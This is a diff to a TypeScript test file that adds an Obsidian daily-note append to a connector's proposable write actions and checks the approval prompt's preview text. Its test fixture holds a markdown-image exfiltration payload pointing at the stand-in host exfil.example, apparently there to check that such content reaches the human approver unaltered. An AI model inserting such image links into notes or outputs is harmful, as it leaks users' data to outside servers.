@@ -1033,6 +1033,12 @@ const B4A_PROPOSABLE: ReadonlyArray<[string, Record<string, unknown>]> = [
     },
   ],
   ["google_drive.file.create", { name: "notes.md", parentId: "F1", content: "# Notes" }],
+  // B4b (Task B6): the Obsidian daily-note append. Accepted, it still writes only while the
+  // owner's Obsidian opt-in approved the append, because that approval is its sandbox grant.
+  [
+    "obsidian.note.append",
+    { vault_id: "Work", date_iso: "2026-11-05", content: "![](https://exfil.example/?d=x)" },
+  ],
 ];
 
 describe("B4a act door: the calendar and Drive creates show their typed preview, with no before", () => {
@@ -1066,8 +1072,8 @@ describe("B4a act door: the calendar and Drive creates show their typed preview,
     return { act: buildActDeps(w, coord, "c-cli"), prompts };
   }
 
-  test("the three are proposable", () => {
-    expect(B4A_PROPOSABLE).toHaveLength(3);
+  test("the three B4a creates and the B4b append are proposable", () => {
+    expect(B4A_PROPOSABLE).toHaveLength(4);
     for (const [t] of B4A_PROPOSABLE) {
       expect(classifyActionType(t, REAL_CLASSIFY), t).toEqual({ kind: "proposable" });
     }
@@ -1093,9 +1099,11 @@ describe("B4a act door: the calendar and Drive creates show their typed preview,
           ...renderConnectorWritePreviewLines(preview),
         ].join("\n"),
       );
-      expect(prompts[0]?.prompt).toContain(
-        type === "google_drive.file.create" ? "Folder id" : "Attendees",
-      );
+      const marker: Record<string, string> = {
+        "google_drive.file.create": "Folder id",
+        "obsidian.note.append": "Text appended (Markdown, sent as is)",
+      };
+      expect(prompts[0]?.prompt).toContain(marker[type] ?? "Attendees");
       expect(prompts[0]?.details["kind"]).toBe("connector-write");
       // Before-reads run on the model door only (B0b): the Drive folder is not read here.
       expect(prompts[0]?.details["before"]).toBeUndefined();
